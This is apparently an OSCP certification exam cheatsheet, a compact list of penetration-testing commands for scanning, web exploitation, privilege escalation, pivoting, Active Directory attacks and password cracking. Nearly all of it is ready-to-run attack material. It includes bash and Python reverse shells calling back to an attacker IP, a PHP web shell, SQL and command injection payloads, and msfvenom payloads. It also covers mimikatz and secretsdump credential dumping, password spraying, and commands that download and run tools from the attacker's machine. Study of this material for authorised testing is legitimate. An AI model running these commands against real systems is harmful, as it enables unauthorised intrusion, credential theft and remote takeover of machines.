# OSCP Exam Day Cheatsheet

Print this. Keep it next to you during the exam.

---

## SCANNING

```bash
# Quick scan
nmap -sV -sC -oA quick TARGET

# Full port scan (background)
nmap -p- --min-rate=1000 -oA full TARGET &

# UDP
sudo nmap -sU --top-ports 20 -oA udp TARGET

# Through proxychains
proxychains nmap -sT -Pn TARGET -p 22,80,445,3389,5985

# Vulnerability scan
nmap --script vuln TARGET
```

## WEB ENUMERATION

```bash
# Directory brute force
gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak -o dirs.txt

# Bigger wordlist
gobuster dir -u http://TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html

# WordPress
wpscan --url http://TARGET --enumerate u,p,t

# Quick checks
curl -s http://TARGET | grep "<!--"
curl http://TARGET/robots.txt
curl http://TARGET/.git/HEAD
```

## SERVICE ENUMERATION

```bash
# SMB
enum4linux -a TARGET
smbclient -L //TARGET -N
crackmapexec smb TARGET -u '' -p '' --shares
nmap --script smb-vuln* -p 445 TARGET

# FTP
ftp TARGET    # try anonymous/(blank)

# SNMP
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt TARGET
snmpwalk -v2c -c public TARGET

# NFS
showmount -e TARGET
```

## WEB ATTACKS

```bash
# SQL injection
' OR 1=1--
' UNION SELECT 1,2,3--
' UNION SELECT 1,@@version,3--
' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database()--

# Command injection
;whoami
|whoami
$(whoami)
`whoami`

# LFI
../../../../etc/passwd
php://filter/convert.base64-encode/resource=config

# File upload
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

## SHELLS

```bash
# Listener
nc -lvnp 4444
rlwrap nc -lvnp 4444

# Bash reverse shell
bash -i >& /dev/tcp/KALI_IP/4444 0>&1

# Python reverse shell
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("KALI_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# PowerShell (base64 encode the full payload and use: powershell -enc BASE64)

# MSFVenom
msfvenom -p linux/x64/shell_reverse_tcp LHOST=KALI LPORT=4444 -f elf -o shell.elf
msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI LPORT=4444 -f exe -o shell.exe

# Shell upgrade
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl+Z
stty raw -echo; fg
export TERM=xterm SHELL=bash
```

## LINUX PRIVESC

```bash
sudo -l                                         # CHECK FIRST ALWAYS
find / -perm -4000 -type f 2>/dev/null          # SUID binaries
getcap -r / 2>/dev/null                         # capabilities
cat /etc/crontab && ls -la /etc/cron*           # cron jobs
find / -writable -type f 2>/dev/null            # writable files
cat /home/*/.bash_history 2>/dev/null           # history
uname -r                                         # kernel version

# SUID exploits (check GTFOBins)
/path/find . -exec /bin/bash -p \;
/path/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
/path/bash -p
/path/vim -c ':!bash'

# Upload LinPEAS
wget http://KALI/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh
```

## WINDOWS PRIVESC

```cmd
whoami /priv                                     :: CHECK FIRST
systeminfo                                       :: OS version
wmic service get name,pathname | findstr /v """  :: unquoted paths
reg query HKLM\...\Installer /v AlwaysInstallElevated  :: MSI privesc
cmdkey /list                                     :: saved creds
findstr /si password *.txt *.ini *.config        :: credential hunting

:: SeImpersonatePrivilege → Potato attack
.\PrintSpoofer64.exe -i -c cmd
.\GodPotato.exe -cmd "cmd /c whoami"

:: Upload WinPEAS
certutil -urlcache -f http://KALI/winpeas.exe winpeas.exe
.\winpeas.exe
```

## FILE TRANSFERS

```bash
# Kali → Linux
python3 -m http.server 80         # Kali
wget http://KALI/file              # target

# Kali → Windows
python3 -m http.server 80         # Kali
certutil -urlcache -f http://KALI/file.exe file.exe   # target
iwr http://KALI/file.exe -o file.exe                   # PowerShell

# SMB server (best for Windows)
impacket-smbserver share /tmp -smb2support   # Kali
copy \\KALI\share\file.exe C:\temp\           # target
```

## PIVOTING

```bash
# SSH local forward (one service)
ssh -L 8080:INTERNAL:80 user@PIVOT

# SSH SOCKS proxy (broad access)
ssh -D 9050 user@PIVOT
# proxychains4.conf: socks5 127.0.0.1 9050
proxychains nmap -sT -Pn INTERNAL_TARGET

# SSH jump
ssh -J user@PIVOT user@INTERNAL

# Chisel (when SSH is blocked)
chisel server --reverse --port 8080           # Kali
./chisel client KALI:8080 R:socks             # target
# proxychains4.conf: socks5 127.0.0.1 1080
```

## ACTIVE DIRECTORY

```bash
# Enumerate
crackmapexec smb DC -u user -p pass --users --shares
bloodhound-python -u user -p pass -d domain.local -ns DC -c all

# AS-REP Roast (no creds needed)
impacket-GetNPUsers domain.local/ -usersfile users.txt -dc-ip DC -format hashcat
hashcat -m 18200 hashes.txt rockyou.txt

# Kerberoast (any domain user)
impacket-GetUserSPNs domain.local/user:pass -dc-ip DC -request
hashcat -m 13100 hashes.txt rockyou.txt

# Password spray
crackmapexec smb DC -u users.txt -p 'Password1!' --continue-on-success

# Pass the Hash
impacket-psexec domain/admin@TARGET -hashes LM:NTLM
evil-winrm -i TARGET -u admin -H NTLM_HASH

# Dump creds
impacket-secretsdump domain/admin:pass@TARGET
mimikatz# sekurlsa::logonpasswords
mimikatz# lsadump::dcsync /domain:domain.local /user:administrator
```

## PASSWORD CRACKING

```bash
# Online
hydra -l user -P rockyou.txt ssh://TARGET -t 4 -f
crackmapexec smb TARGET -u user -p rockyou.txt

# Offline
hashcat -m 0 hashes rockyou.txt        # MD5
hashcat -m 1000 hashes rockyou.txt     # NTLM
hashcat -m 1800 hashes rockyou.txt     # Linux shadow
hashcat -m 13100 hashes rockyou.txt    # Kerberoast
hashcat -m 18200 hashes rockyou.txt    # AS-REP

# File hashes
ssh2john id_rsa > hash && john hash --wordlist=rockyou.txt
zip2john file.zip > hash && john hash --wordlist=rockyou.txt
```

## PROOF SCREENSHOTS (mandatory format)

```bash
# Linux
cat /path/local.txt && whoami && ip a
cat /path/proof.txt && whoami && ip a

# Windows
type C:\path\local.txt & whoami & ipconfig
type C:\path\proof.txt & whoami & ipconfig
```

## METASPLOIT (ONE TARGET ONLY — multi/handler is exempt)

```bash
msfconsole
use exploit/multi/handler
set PAYLOAD linux/x64/shell_reverse_tcp
set LHOST KALI_IP
set LPORT 4444
run -j

sessions
sessions -i 1
sessions -u 1          # upgrade to Meterpreter
```

## WHEN STUCK

```
□ Full port scan done?     nmap -p-
□ UDP scanned?             nmap -sU --top-ports 20
□ Page source checked?     curl -s TARGET | grep "<!--"
□ Bigger wordlist tried?   directory-list-2.3-medium.txt
□ Credentials tried everywhere?  crackmapexec smb 0/24 -u x -p y
□ searchsploit every version?
□ Default creds tried?
□ Take a 10-min break?
□ Move to different target?
```
